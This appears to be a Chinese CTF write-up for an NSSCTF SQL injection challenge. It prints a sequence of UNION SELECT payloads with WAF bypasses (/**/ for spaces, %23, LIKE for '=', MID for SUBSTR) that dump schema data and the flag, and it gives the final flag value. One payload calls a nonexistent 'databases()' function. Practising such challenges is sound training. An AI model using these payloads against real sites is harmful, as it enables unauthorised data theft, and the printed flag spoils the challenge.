## 基本信息

* 题目名称： [SWPUCTF 2021 新生赛]sql
* 题目链接： https://www.nssctf.cn/problem/442
* 考点清单： SQL注入、WAF绕过、联合查询
* 工具清单： Hackbar


## 一、解题思路

1. 根据题目与网页标题的提示，尝试在 URL 的 `wllm` 参数处添加 SQL 注入 Payload。
2. 探测是否存在 WAF，并尝试各种绕过方式（如大小写、注释符替换、空格替换等）。
3. 使用联合查询（Union Select）依次获取数据库名、表名、列名。
4. 最终查询 Flag，如果遇到长度限制或函数拦截，寻找替代方案（如 `mid` 替代 `substr`）。

## 二、解题过程

1. 尝试在URL中添加`?wllm=1'`，页面返回异常信息。
   <p align="center">
   <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-sql_inject_attempt.png" alt="尝试">
   </p>
   
2. 尝试`?wllm=1' or '1'='1`，触发了 WAF 报警。
   
3. 尝试`?wllm=1' union select 1,2-- `，依然触发 WAF。
   
4. 尝试大小写混合绕过 `?wllm=1' UnIoN sElEcT 1,2-- `，失败。
   将空格替换为`/**/`，尝试`?wllm=1'/**/UnIoN/**/sElEcT/**/1,2--/**/`，出现查询错误。
   <p align="center">
   <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-query_error.png" alt="查询错误">
   </p>
   
5. 根据提示，最后的空格不能以`/**/`结尾。尝试`?wllm=1'/**/UnIoN/**/sElEcT/**/1,2--+`，仍然触发 WAF。
   
6. 尝试使用`#`的 URL 编码`%23`代替`--`，且不使用空格。
   `?wllm=1'/**/UnIoN/**/sElEcT/**/1,2%23`
   成功绕过 WAF。
   <p align="center">
   <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-waf_bypass_success.png" alt="绕过">
   </p>
   
7. 结果提示列数不匹配，尝试增加列数。
   ```
   ?wllm=1'/**/UnIoN/**/sElEcT/**/1,2,3%23
   ```
   页面正常返回，说明有 3 列。
   <p align="center">
   <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-column_count_check.png" alt="3列">
   </p>
   
8. 检查回显列。
   ```
   ?wllm=-1'/**/UnIoN/**/sElEcT/**/'a','b','c'%23
   ```
   <p align="center">
   <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-visible_columns.png" alt="显示列">
   </p>
   发现第 2 和第 3 列被显示出来。
   
9. 获取数据库名。
   ```
   ?wllm=-1'/**/UnIoN/**/sElEcT/**/1,2,databases()%23
   ```
   <p align="center">
   <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-database_name.png" alt="数据库名">
   </p>
   得到数据库名 `test_db`。
   
10. 获取表名。尝试使用 `=` 和 `and` 均被拦截。尝试使用 `like` 代替 `=`。
    ```
    ?wllm=-1'/**/UnIoN/**/sElEcT/**/1,2,table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'%23
    ```
    <p align="center">
    <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-table_names.png" alt="表名">
    </p>
    成功绕过，查到表名。同理可以查到第二个表是 `users`。
    
11. 获取列名。查询 `LTLT_flag` 表。
    ```
    ?wllm=-1'/**/UNION/**/SELECT/**/1,2,column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/LIKE/**/'LTLT_flag'/**/LIMIT/**/1,1%23
    ```
    <p align="center">
    <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-column_names.png" alt="列名">
    </p>
    查看到字段名是 `flag`。
    
12. 获取 Flag。
    `?wllm=-1'/**/UNION/**/SELECT/**/1,2,flag/**/FROM/**/LTLT_flag%23`
    <p align="center">
    <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-flag_partial.png" alt="flag">
    </p>
    显示不全。
    
13. 查看长度。
    ```
    ?wllm=-1'/**/UNION/**/SELECT/**/1,2,LENGTH(flag)/**/FROM/**/LTLT_flag%23
    ```
    <p align="center">
    <img src="images/%5BSWPUCTF 2021 新生赛%5Dsql-flag_length.png" alt="长度">
    </p>
    长度为 44。
    
14. 分段获取 Flag。尝试 `substr` 被拦截，使用 `mid` 代替。
    ```
    ?wllm=-1'/**/UNION/**/SELECT/**/1,2,MID(flag,1,20)/**/FROM/**/LTLT_flag%23
    ```
    最后拼接出 flag 是 `NSSCTF{1a1b08f7-39b2-4430-8d17-d315180fdae9}`。

## 三、总结与反思

1. 遇到 WAF 时，尝试多种替换策略（如 `/**/` 替换空格、`%23` 替换 `#`、`like` 替换 `=`）。
2. 常用函数被禁用时（如 `substr`），寻找同义函数替代（如 `mid`）。
3. 注意 SQL 注入中的细节，如 URL 编码和注释符的使用。